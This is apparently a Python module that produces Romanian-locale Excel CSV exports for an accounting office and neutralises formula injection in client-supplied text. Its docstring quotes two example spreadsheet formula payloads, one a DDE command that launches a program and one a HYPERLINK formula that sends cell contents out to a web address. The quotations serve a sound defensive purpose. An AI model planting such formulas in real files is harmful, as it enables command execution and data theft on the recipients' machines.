"""Cum trebuie să arate un CSV ca să se deschidă corect în Excel pe românește.

Fiecare regulă de aici a fost plătită o dată. Le ține la un loc pentru că un al
doilea export scris de la zero le-ar fi respectat pe unele și nu pe toate — iar
un fișier care se deschide „aproape bine" se repară de mână, de fiecare dată.

- **separatorul este `;`**, nu virgulă: cu virgulă, Excel în setările românești
  pune tot rândul într-o singură coloană;
- **BOM la început**: fără el, Excel citește UTF-8 ca ANSI și „Rată" devine
  „RatÄƒ";
- **sfârșit de linie CRLF**, pentru că Windows este destinația;
- **virgulă la zecimale**: `1234.56` scris cu punct nu este un număr pentru Excel
  în setările românești. Îl ia ca text, îl aliniază la stânga și nu îl adună.
  Este cea mai perfidă dintre cele patru, fiindcă fișierul pare bun până când
  cineva trage un total pe coloană și primește zero;
- **fără separator de mii**: `1.234,56` ar fi frumos de citit și ar reintroduce
  exact ambiguitatea pe care o rezolvă virgula.

Valorile trec prin `csv.writer`, care scapă singur ghilimelele și separatorii din
interiorul lor: un client care are `;` în denumire nu are voie să rupă coloanele.
Aceea este integritatea **coloanelor**. Ce face Excel cu valoarea după ce a citit-o
este altă întrebare, și are răspunsul în `_as_text` de mai jos.
"""

from __future__ import annotations

import csv
import datetime as dt
import io
import re
from decimal import Decimal
from typing import Final

from app.core.errors import ValidationError

#: Separatorul așteptat de Excel în setările românești.
DELIMITER: Final = ";"

#: Fără el, Excel citește fișierul ca ANSI și diacriticele se strică.
BOM: Final = "﻿"

#: Windows este destinația.
LINE_ENDING: Final = "\r\n"


#: Caracterele de la care Excel și LibreOffice încep să citească o **formulă**, nu
#: un text. Tab și retur de car sunt aici pentru că amândouă sunt sărite, iar
#: hotărârea se ia pe caracterul de după ele.
_FORMULA_STARTS: Final = ("=", "+", "-", "@", "\t", "\r")

#: Ce scrie `number()`. Singura formă care are voie să înceapă cu `-`.
_NUMBER: Final = re.compile(r"^-?\d+(,\d+)?$")


def _as_text(value: str) -> str:
    """Aceeași valoare, dar pe care Excel nu o poate lua drept formulă.

    **De ce este nevoie.** Textul din aceste fișiere nu este scris de cabinet.
    `Furnizor`, în registrul lunii, vine din citirea unui document **trimis de
    client** — deci din afara cabinetului, de la oricine are linkul de încărcare.
    O celulă care începe cu `=` nu este afișată de Excel, ci **evaluată**, iar
    formulele nu se opresc la aritmetică: `=cmd|'/c calc'!A1` cere pornirea unui
    program, iar `=HYPERLINK("http://…"&A2,"Deschide")` scoate conținutul celulei
    vecine pe internet la o apăsare, fără niciun macro. Drumul este întreg:
    document ostil → extracție → registru → fișierul deschis de contabil.

    **Apostroful** este semnul pe care Excel îl citește ca „ce urmează este text".
    Nu se vede în celulă și nu se pierde nimic din ce scria acolo: cine se uită în
    registru trebuie să vadă exact ce spunea documentul, altfel nu înțelege de ce
    arată așa.

    **Numerele trec neatinse.** `-1234,56` începe cu `-` și este exact valoarea pe
    care contabilul o adună pe coloană; un apostrof ar face-o text, iar totalul ar
    ieși zero. Este chiar paguba pe care fișierul acesta o numește, mai sus, cea
    mai perfidă — nu are rost s-o reintroducem pe ușa din dos. Datele scrise de
    `day()` încep cu o cifră, deci nu ajung niciodată aici.
    """
    if not value.startswith(_FORMULA_STARTS):
        return value
    if _NUMBER.match(value):
        return value
    return "'" + value


#: Cat de mare poate fi un fisier de import. Un CSV de o mie de randuri are
#: sub 200 KB; peste asta, cineva a urcat altceva.
MAX_IMPORT_BYTES: Final = 2 * 1024 * 1024


def decode(raw: bytes) -> str:
    """Textul fișierului, oricum ar fi fost salvat.

    **De ce nu doar UTF-8.** „Salvează ca CSV" din Excel pe Windows românesc
    scrie cp1252, nu UTF-8. Un import care cere UTF-8 refuză exact fișierul pe
    care îl produce programul din care vine lista — și îl refuză cu un mesaj
    despre codificare, pe care nimeni nu are cum să-l urmeze.

    Se încearcă întâi UTF-8, fiindcă el nu poate fi confundat: o secvență validă
    de UTF-8 apărută din întâmplare într-un fișier pe un octet este practic
    imposibilă. Invers nu se poate spune, deci codificarea veche rămâne ultima.

    **cp1250, nu cp1252.** Windows-ul românesc folosește pagina de cod
    central-europeană; `ă`, `ș` și `ț` nici nu există în cp1252, deci un fișier
    care le conține nu poate fi cp1252. Fișierele vechi poartă `ş`/`ţ` cu
    sedilă în loc de virgulă — asta scria pagina de cod atunci, iar aplicația
    citește ce este în fișier, nu ce ar fi trebuit să fie.
    """
    if len(raw) > MAX_IMPORT_BYTES:
        raise ValidationError(
            "Fișierul este prea mare.",
            {"file": [f"Maximum {MAX_IMPORT_BYTES // (1024 * 1024)} MB."]},
        )
    for encoding in ("utf-8-sig", "utf-8", "cp1250"):
        try:
            return raw.decode(encoding)
        except UnicodeDecodeError:
            continue
    raise ValidationError(
        "Fișierul nu poate fi citit ca text.",
        {"file": ["Salvează-l ca CSV, nu ca xlsx."]},
    )


def render(rows: list[list[str]]) -> str:
    """Rândurile, ca fișier gata de trimis ca răspuns.

    Trecerea prin `_as_text` se face **aici**, nu la fiecare export. Sunt patru
    exporturi și vor fi mai multe; o regulă aplicată la fiecare capăt se respectă
    pe primele trei și se uită la al patrulea. Prin locul acesta trece tot ce iese.
    """
    buffer = io.StringIO()
    writer = csv.writer(buffer, delimiter=DELIMITER, lineterminator=LINE_ENDING)
    writer.writerows([[_as_text(cell) for cell in row] for row in rows])
    return BOM + buffer.getvalue()


def number(value: Decimal | float | None, *, decimals: int = 2) -> str:
    """Un număr pe care Excel românesc îl recunoaște ca număr.

    Gol pentru `None`, nu zero: într-un registru contabil, „nu s-a citit suma"
    și „suma este zero" sunt două lucruri diferite, iar al doilea se aprobă.
    """
    if value is None:
        return ""
    return f"{value:.{decimals}f}".replace(".", ",")


def day(value: dt.date | None) -> str:
    """Data în forma pe care o citește un contabil, `31.08.2026`.

    ISO ar fi fost mai comod de sortat, dar fișierul este pentru om și pentru
    Excel, nu pentru un parser: în setările românești `31.08.2026` intră ca dată,
    iar `2026-08-31` intră ca text.
    """
    return "" if value is None else value.strftime("%d.%m.%Y")


__all__ = [
    "BOM",
    "DELIMITER",
    "LINE_ENDING",
    "MAX_IMPORT_BYTES",
    "day",
    "decode",
    "number",
    "render",
]
